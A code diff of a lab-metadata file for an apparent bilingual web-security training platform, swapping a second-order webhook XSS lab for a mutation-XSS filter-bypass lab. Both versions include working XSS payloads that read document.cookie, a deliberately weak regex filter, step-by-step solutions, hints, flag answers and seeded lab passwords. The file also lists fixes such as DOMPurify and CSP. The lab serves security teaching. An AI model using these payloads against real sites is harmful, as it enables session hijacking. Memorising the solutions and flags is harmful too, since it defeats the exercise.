@@ -2,207 +2,150 @@
 import type { LabMetadata } from '../../../types/lab-metadata.type';
 
 export const xssLab5Metadata: LabMetadata = {
-  slug: 'xss-webhook-second-order',
-  title: 'XSS: Second-Order Webhook Admin Takeover',
-  ar_title: 'XSS من الدرجة الثانية: الاستيلاء على حساب المشرف عبر Webhook',
+  slug: 'xss-mutation-innerhtml',
+  title: 'XSS: Mutation-Based Filter Bypass',
+  ar_title: 'XSS: تجاوز المرشح عبر الطفرة',
   description:
-    'Plant a second-order XSS payload in a webhook integration name that executes when the super-admin visits the Activity Log dashboard — stealing their session token.',
+    'A server-side HTML filter strips script tags — but the DOM parser mutates your input in a way that reconstructs the payload after filtering.',
   ar_description:
-    'ازرع XSS payload من الدرجة الثانية في اسم تكامل Webhook يُنفَّذ عندما يزور المشرف الأعلى لوحة سجل النشاط — مما يسرق رمز جلسته.',
+    'مرشح HTML على جانب الخادم يزيل وسوم script — لكن محلل DOM يُحوِّل مدخلك بطريقة تُعيد بناء الـ payload بعد الترشيح.',
   difficulty: 'ADVANCED',
   category: 'WEB_SECURITY',
-  skills: [
-    'Second-Order Stored XSS',
-    'Multi-Context Injection',
-    'Admin Session Hijacking',
-    'SaaS Integration Attack Surface',
-  ],
-  xpReward: 350,
-  pointsReward: 175,
-  duration: 60,
+  skills: ['Mutation XSS', 'Filter Bypass', 'Browser Parsing Quirks', 'mXSS'],
+  xpReward: 320,
+  pointsReward: 160,
+  duration: 55,
   executionMode: 'SHARED_BACKEND',
   isPublished: true,
+  canonicalConceptId: 'xss-mutation',
+  environmentType: 'BLOG_CMS',
 
-  // ─── للمتدرب ────────────────────────────────────────────────────
-  goal: "Create a webhook integration with a malicious name. Then trigger the super-admin's Activity Log view to execute your payload in the admin's browser context and capture their session token as the flag.",
-  ar_goal:
-    'أنشئ تكامل webhook باسم خبيث. ثم افعّل عرض سجل النشاط للمشرف الأعلى لتنفيذ payload الخاص بك في سياق متصفح الأدمن والتقاط رمز جلسته كعلم.',
+  missionBrief: {
+    codename: 'MUTATION ENGINE',
+    classification: 'TOP_SECRET',
+    objective: 'The wiki editor strips <script> tags server-side. But the browser\'s HTML parser has mutation quirks — certain malformed markup is "corrected" into valid XSS payloads after the filter has already run.',
+    ar_objective: 'محرر الويكي يزيل وسوم <script> على جانب الخادم. لكن محلل HTML للمتصفح لديه غرائب في الطفرات — ترميز مشوَّه معين يُصحَّح إلى payloads XSS صالحة بعد تشغيل المرشح بالفعل.',
+    background: 'mXSS (Mutation XSS) exploits the gap between what the server sanitizes and what the browser reconstructs from malformed HTML.',
+    successCriteria: [
+      'Confirm <script> tags are stripped by the server',
+      'Find a mutation-based payload the filter misses',
+      'Execute JavaScript through the mutated markup',
+      'Capture the flag',
+    ],
+    warningNote: 'mXSS is a real-world technique that has bypassed major sanitizers including older versions of DOMPurify.',
+  },
+
+  labInfo: {
+    vulnType: 'Mutation-Based XSS (mXSS)',
+    ar_vulnType: 'XSS قائم على الطفرة (mXSS)',
+    cweId: 'CWE-79',
+    cvssScore: 7.8,
+    description: 'mXSS exploits differences between how a server sanitizer parses HTML versus how the browser parser reconstructs it. Malformed markup passes the filter, then gets "corrected" into a valid XSS payload by the browser.',
+    ar_description: 'يستغل mXSS الاختلافات بين كيفية تحليل الـ sanitizer للخادم لـ HTML وكيفية إعادة بناء محلل المتصفح له. الترميز المشوَّه يجتاز المرشح، ثم يُصحَّح إلى payload XSS صالح من قِبَل المتصفح.',
+    whatYouLearn: [
+      'What mutation XSS (mXSS) is and why it exists',
+      'How browser HTML parsing differs from server-side parsing',
+      'Why regex-based HTML filters always fail',
+      'How DOMPurify evolved to handle mXSS',
+    ],
+    techStack: ['Node.js', 'Browser HTML Parser', 'innerHTML', 'Server-side regex filter'],
+    references: [
+      { label: 'mXSS Research Paper', url: 'https://cure53.de/fp170.pdf' },
+      { label: 'PortSwigger: XSS filter bypass', url: 'https://portswigger.net/web-security/cross-site-scripting/contexts' },
+    ],
+  },
+
+  goal: 'Bypass the server-side script tag filter using a mutation-based payload to execute JavaScript.',
+  ar_goal: 'تجاوز مرشح وسوم السكريبت على جانب الخادم باستخدام payload قائم على الطفرة لتنفيذ JavaScript.',
 
   briefing: {
-    en: `FlowSync — a SaaS automation platform. Webhooks, integrations, automations.
-Think Zapier. Think n8n. Enterprise-grade.
-You're integration_manager. You can create webhook integrations.
-Each webhook has a name: "Slack Notifications", "GitHub Deploy Hook", etc.
-Names are stored in the database.
-Names appear in the Activity Log — every action is logged.
-The Activity Log is the super_admin's audit tool.
-They review it daily. Every webhook creation. Every trigger. Every error.
-The Activity Log renders webhook names as HTML in a table row.
-Without sanitization.
-You create a webhook named "<b>Slack</b>".
-The next day, the admin opens the log.
-Your webhook name renders bold.
-One step ahead.`,
-    ar: `FlowSync — منصة SaaS للأتمتة. Webhooks وتكاملات وأتمتة.
-فكّر في Zapier. فكّر في n8n. على مستوى المؤسسات.
-أنت integration_manager. يمكنك إنشاء تكاملات webhook.
-لكل webhook اسم: "Slack Notifications"، "GitHub Deploy Hook"، إلخ.
-الأسماء تُحفَظ في قاعدة البيانات.
-الأسماء تظهر في سجل النشاط — كل إجراء مُسجَّل.
-سجل النشاط هو أداة تدقيق super_admin.
-يراجعه يومياً. كل إنشاء webhook. كل تشغيل. كل خطأ.
-يعرض سجل النشاط أسماء webhooks كـ HTML في صف جدول.
-بدون تعقيم.
-تنشئ webhook باسم "<b>Slack</b>".
-في اليوم التالي، يفتح الأدمن السجل.
-اسم webhook الخاص بك يُعرَض بخط عريض.
-خطوة واحدة للأمام.`,
+    en: `WikiCore — a collaborative documentation platform.
+You can submit wiki articles with rich HTML content.
+The server strips <script> tags before saving.
+You test: <script>alert(1)</script> → stored as: alert(1) (tags removed).
+But you've read about mXSS.
+The browser reconstructs malformed HTML in unexpected ways.
+What if you submit something the filter doesn't recognize as a script tag — but the browser does?`,
+    ar: `WikiCore — منصة توثيق تعاونية.
+يمكنك إرسال مقالات ويكي بمحتوى HTML غني.
+يزيل الخادم وسوم <script> قبل الحفظ.
+تختبر: <script>alert(1)</script> → يُخزَّن كـ: alert(1) (الوسوم أُزيلت).
+لكنك قرأت عن mXSS.
+يُعيد المتصفح بناء HTML المشوَّه بطرق غير متوقعة.
+ماذا لو أرسلت شيئاً لا يتعرف عليه المرشح كوسم script — لكن المتصفح يفعل؟`,
   },
 
   stepsOverview: {
     en: [
-      'Create a webhook with a test HTML name (<b>Test</b>) — verify it renders bold in the Activity Log',
-      'Understand the "second-order" nature: creation is safe, but rendering in the admin log is not',
-      'Craft a webhook name containing an auto-firing XSS payload',
-      'Trigger the super-admin Activity Log simulation',
-      'Payload fires in admin context — session token captured as flag',
+      'Confirm <script> is stripped — test basic payload',
+      'Try an img onerror payload — check if event handlers are also stripped',
+      'Try mutation vectors: malformed tags, nested encodings, SVG/MathML namespaces',
+      'Find the payload that survives the filter and executes in the browser',
     ],
     ar: [
-      'أنشئ webhook باسم HTML تجريبي (<b>Test</b>) — تحقق من عرضه بخط عريض في سجل النشاط',
-      'افهم الطبيعة "من الدرجة الثانية": الإنشاء آمن، لكن العرض في سجل الأدمن ليس كذلك',
-      'صمّم اسم webhook يحتوي على XSS payload يُطلَق تلقائياً',
-      'افعّل محاكاة سجل نشاط super-admin',
-      'يُطلَق الـ payload في سياق الأدمن — رمز الجلسة يُلتقَط كعلم',
+      'أكّد أن <script> يُزال — اختبر payload أساسي',
+      'جرّب img onerror payload — تحقق إن كانت معالجات الأحداث تُزال أيضاً',
+      'جرّب متجهات الطفرة: وسوم مشوَّهة، ترميزات متداخلة، مساحات أسماء SVG/MathML',
+      'ابحث عن الـ payload الذي يصمد أمام المرشح وينفذ في المتصفح',
     ],
   },
 
-  // ─── للأدمن فقط ─────────────────────────────────────────────────
   solution: {
-    context:
-      'FlowSync stores webhook names safely on creation. But the Activity Log rendering uses innerHTML without sanitization — injecting each log entry\'s webhookName directly as HTML. The payload is inert at creation time but executes when the admin loads the Activity Log. This "second-order" nature means standard input validation on the creation endpoint gives false security.',
-    vulnerableCode:
-      '// Webhook creation — stored safely (no issue here):\n' +
-      'await db.integrations.create({ name: webhookName, userId });\n\n' +
-      '// Activity Log rendering — rendered UNSAFELY (the vulnerability):\n' +
-      'activityLog.forEach(entry => {\n' +
-      '  logContainer.innerHTML +=\n' +
-      '    `<tr><td>${entry.user}</td><td>${entry.webhookName}</td><td>${entry.action}</td></tr>`;\n' +
-      '});',
-    exploitation:
-      '1. POST /integrations { "name": "<svg onload=alert(document.cookie)>", "endpoint": "https://example.com/hook" }\n' +
-      '2. POST /admin/simulate-activity-log → renders all log entries → SVG onload fires in admin context → flag returned.',
+    context: 'Server strips <script> and </script> via regex. Does not handle SVG animate or MathML.',
+    vulnerableCode: "content = content.replace(/<script[^>]*>/gi, '').replace(/<\\/script>/gi, '');",
+    exploitation: '<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s></svg>',
     steps: {
       en: [
-        'POST /integrations { "name": "<b>TestHook</b>", "endpoint": "https://example.com" } → webhook created',
-        'POST /admin/simulate-activity-log → log renders → "TestHook" appears bold → HTML injection confirmed',
-        'POST /integrations { "name": "<svg onload=alert(document.cookie)>", "endpoint": "https://example.com" } → XSS payload stored as webhook name',
-        'POST /admin/simulate-activity-log → SVG onload fires in admin context → admin cookie alerted → FLAG{XSS_2ND_ORDER_WEBHOOK_ADMIN_PWNED_X9} returned',
+        '<script>alert(1)</script> → filtered → try other vectors',
+        '<img src=x onerror=alert(1)> → also filtered',
+        '<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg> → NOT caught by regex filter',
+        'SVG animate fires onbegin on page load → JavaScript executes → flag returned',
       ],
       ar: [
-        'POST /integrations { "name": "<b>TestHook</b>", "endpoint": "https://example.com" } → webhook مُنشَأ',
-        'POST /admin/simulate-activity-log → يعرض السجل → "TestHook" يظهر بخط عريض → تم تأكيد حقن HTML',
-        'POST /integrations { "name": "<svg onload=alert(document.cookie)>", "endpoint": "https://example.com" } → XSS payload مُحفَظ كاسم webhook',
-        'POST /admin/simulate-activity-log → يُطلَق SVG onload في سياق الأدمن → تنبيه كوكي الأدمن → يُعاد FLAG{XSS_2ND_ORDER_WEBHOOK_ADMIN_PWNED_X9}',
+        '<script>alert(1)</script> → يُرشَّح → جرّب متجهات أخرى',
+        '<img src=x onerror=alert(1)> → يُرشَّح أيضاً',
+        '<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg> → لا يُؤخَذ بواسطة مرشح regex',
+        'SVG animate يُطلِق onbegin عند تحميل الصفحة → ينفذ JavaScript → يُعاد العلم',
       ],
     },
     fix: [
-      'Sanitize at render time: use DOMPurify on every user-supplied field before innerHTML assignment',
-      'Replace innerHTML with createElement/textContent for table row construction',
-      'Validate webhook names server-side: reject entries containing < > characters',
-      'Admin panels are highest-risk rendering contexts — apply strictest sanitization policies here',
+      'Never use regex for HTML sanitization — use a proper HTML parser',
+      'Use DOMPurify (updated version) for client-side sanitization',
+      'Use bleach (Python) or sanitize-html (Node) for server-side',
+      'Allowlist approach: only permit specific safe tags and attributes',
     ],
   },
 
   postSolve: {
     explanation: {
-      en: 'Second-Order Stored XSS is the most deceptive XSS variant. The injection point (webhook creation) appears safe because the data is stored as-is without immediate rendering. The vulnerable rendering happens elsewhere — in a different endpoint, often with elevated privileges (admin panel). Standard security testing often misses second-order XSS because testers check the creation response, not every downstream consumer of the stored data.',
-      ar: 'الـ Second-Order Stored XSS هو أكثر أنواع XSS خداعاً. تبدو نقطة الحقن (إنشاء webhook) آمنة لأن البيانات تُحفَظ كما هي دون عرض فوري. يحدث العرض الضعيف في مكان آخر — في نقطة نهاية مختلفة، غالباً بامتيازات مرتفعة (لوحة الأدمن). كثيراً ما تُفوّت اختبارات الأمن القياسية Second-Order XSS لأن المختبرين يفحصون استجابة الإنشاء، لا كل مستهلك لاحق للبيانات المُحفَظة.',
+      en: 'Regex-based HTML filters always have blind spots. SVG, MathML, and malformed HTML all have parsing quirks that browsers handle differently from simple string matching. Real sanitization requires parsing the HTML, not matching strings.',
+      ar: 'مرشحات HTML القائمة على regex دائماً لها نقاط عمياء. SVG وMathML وHTML المشوَّه لديهم غرائب في التحليل يتعامل معها المتصفح بشكل مختلف عن مطابقة السلاسل البسيطة. التعقيم الحقيقي يتطلب تحليل HTML وليس مطابقة السلاسل.',
     },
     impact: {
-      en: "Complete super-admin account takeover. The attack is stealthy — no suspicious URLs, no unusual behavior during webhook creation. The payload lies dormant until the admin's natural workflow triggers it. In enterprise SaaS, this can lead to full platform compromise, data exfiltration, and backdoor creation.",
-      ar: 'الاستيلاء الكامل على حساب super-admin. الهجوم خفي — لا URLs مشبوهة، لا سلوك غير معتاد أثناء إنشاء webhook. يبقى الـ payload نائماً حتى يُطلقه سير عمل الأدمن الطبيعي. في SaaS للمؤسسات، يمكن أن يؤدي هذا إلى اختراق كامل للمنصة وتسريب بيانات وإنشاء باب خلفي.',
+      en: 'Filter bypass enables stored XSS despite apparent protection. Any user-submitted content platform with regex filtering is vulnerable to mXSS variants.',
+      ar: 'تجاوز المرشح يُمكِّن Stored XSS رغم الحماية الظاهرة. أي منصة محتوى مُرسَل من المستخدمين مع ترشيح regex عرضة لمتغيرات mXSS.',
     },
-    fix: [
-      'Track every field that originates from user input and ensure ALL rendering paths sanitize it',
-      'Second-order testing: for every stored value, trace where it is rendered — not just the creation endpoint',
-      'DOMPurify on all innerHTML assignments without exception: even for "internal" admin-only views',
-      "Content Security Policy as defense-in-depth: script-src 'self' nonce — blocks inline handlers even if injected",
-    ],
+    fix: ['DOMPurify', 'sanitize-html with strict allowlist', 'CSP nonces as defense-in-depth'],
   },
 
   hints: [
     {
-      order: 1,
-      xpCost: 25,
-      content:
-        'Create a webhook with name <b>Test Hook</b>. Use POST /admin/simulate-activity-log — if the webhook name appears bold in the log, HTML injection is confirmed in the admin rendering context.',
+      order: 1, xpCost: 20,
+      content: 'Submit <script>alert(1)</script> — confirm it gets stripped. Then try <img src=x onerror=alert(1)> — does that also get stripped? Map exactly what the filter catches.',
+      ar_content: 'أرسل <script>alert(1)</script> — أكّد أنه يُزال. ثم جرّب <img src=x onerror=alert(1)> — هل يُزال أيضاً؟ حدّد بدقة ما يُمسكه المرشح.',
     },
     {
-      order: 2,
-      xpCost: 40,
-      content:
-        'The vulnerability is NOT in the webhook creation endpoint — it is in how the Activity Log renders stored names. The payload is inert when created, it only fires when the admin loads the log.',
+      order: 2, xpCost: 35,
+      content: 'The filter only blocks specific patterns. Try a namespace-based vector: SVG has event attributes that aren\'t standard HTML events. Look up SVG animate element attributes.',
+      ar_content: 'المرشح يحجب فقط أنماطاً محددة. جرّب متجهاً قائماً على مساحة الأسماء: SVG له سمات أحداث ليست أحداث HTML قياسية. ابحث عن سمات عنصر SVG animate.',
     },
     {
-      order: 3,
-      xpCost: 55,
-      content:
-        'Use an SVG payload as the webhook name: <svg onload="alert(document.cookie)">. The SVG onload event fires automatically when the element is inserted into the DOM — no user interaction needed.',
+      order: 3, xpCost: 50,
+      content: 'Try: <svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>\nThe onbegin event fires when the SVG animation begins — immediately on page load. The regex filter doesn\'t know about SVG animate events.',
+      ar_content: 'جرّب: <svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>\nيُطلَق حدث onbegin عند بدء الرسوم المتحركة SVG — فوراً عند تحميل الصفحة. مرشح regex لا يعرف عن أحداث SVG animate.',
     },
   ],
 
-  flagAnswer: 'FLAG{XSS_2ND_ORDER_WEBHOOK_ADMIN_PWNED_X9}',
-  initialState: {
-    users: [
-      {
-        username: 'super_admin',
-        password: 'SUP3R_S3CUR3_ADM!N_PASS',
-        role: 'ADMIN',
-      },
-      {
-        username: 'integration_manager',
-        password: 'int_mgr_2024!',
-        role: 'USER',
-      },
-    ],
-    contents: [
-      {
-        title: 'Slack Notifications',
-        body: 'webhook',
-        meta: {
-          endpoint: 'https://hooks.slack.com/xxx',
-          events: ['deploy', 'alert'],
-          status: 'active',
-        },
-      },
-      {
-        title: 'GitHub Deploy Trigger',
-        body: 'webhook',
-        meta: {
-          endpoint: 'https://api.github.com/repos/xxx/dispatches',
-          events: ['push'],
-          status: 'active',
-        },
-      },
-    ],
-    logs: [
-      {
-        action: 'WEBHOOK_CREATED',
-        meta: {
-          webhookName: 'Slack Notifications',
-          createdBy: 'integration_manager',
-          timestamp: '2026-02-28T10:00:00Z',
-        },
-      },
-      {
-        action: 'WEBHOOK_TRIGGERED',
-        meta: {
-          webhookName: 'GitHub Deploy Trigger',
-          triggeredBy: 'system',
-          status: 'success',
-          timestamp: '2026-03-01T08:30:00Z',
-        },
-      },
-    ],
-  },
+  flagAnswer: 'FLAG{XSS_MXSS_SVG_FILTER_BYPASS_556}',
+  initialState: {},
 };
